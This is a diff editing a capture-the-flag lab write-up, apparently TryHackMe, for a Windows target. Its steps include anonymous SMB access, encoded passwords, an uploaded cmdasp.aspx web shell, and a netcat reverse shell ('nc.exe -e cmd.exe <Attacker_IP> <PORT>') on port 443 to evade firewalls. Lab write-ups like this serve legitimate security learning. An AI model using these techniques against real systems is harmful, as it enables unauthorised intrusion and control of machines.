@@ -223,7 +223,7 @@ S-1-5-32-547 BUILTIN\Power Users (Local Group)
 S-1-5-32-550 BUILTIN\Print Operators (Local Group)
 ```
 
-Lets check that `nt4wrksv` share: `smbclient -N //<MACHINE_IP>/nt4wrksv`. Once connected i found a file called `passwords.txt` cool:
+Lets check that `nt4wrksv` share: `smbclient -N //<MACHINE_IP>/nt4wrksv`. Once connected I found a file called `passwords.txt` cool:
 ```
 [User Passwords - Encoded]
 Qm9iIC0gIVBAJCRXMHJEITEyMw==
@@ -251,17 +251,17 @@ I tried the passwords but no luck, maybe they are valid usernames but the passwo
 
 ### RCE
 
-We have access to that share so... can we get a RCE? I uploaded `cmdasp.aspx` and there it was, allowing me to execete commands nice.
+We have access to that share so... can we get a RCE? I uploaded `cmdasp.aspx` and there it was, allowing me to execute commands nice.
 
-Now i will try to upload `nc.exe` to the share and get a proper reverse shell.
+Now I will try to upload `nc.exe` to the share and get a proper reverse shell.
 
 ### Reverse shell!
 
-First i had to find the directory, i was pretty lucky i found it fast:
+First I had to find the directory, I was pretty lucky and I found it fast:
 ```
 dir C:\inetpub\wwwroot\nt4wrksv
 ```
-There it is, nc.exe. Lest try `nc.exe -e cmd.exe <Attacker_IP> <PORT>` with a netcat listener in our site. After some try and error i tried with the port 443 to avoid possible firewalls aaaand the shell came back cool.
+There it is, nc.exe. Lest try `nc.exe -e cmd.exe <Attacker_IP> <PORT>` with a netcat listener in our site. After some try and error I tried with the port 443 to avoid possible firewalls aaaand the shell came back cool.
 
 #### User flag
 
@@ -305,10 +305,11 @@ Microsoft Windows [Version 10.0.14393]
 C:\Windows\system32>
 ```
 
-And yep, an Administrator shell cool.
+And yep, a `system` shell cool.
 
 ### Root flag
 
 Just execute `more C:\Users\Administrator\Desktop\root.txt`:
 ```
-THM{*******************************} 
+THM{*******************************}
+```
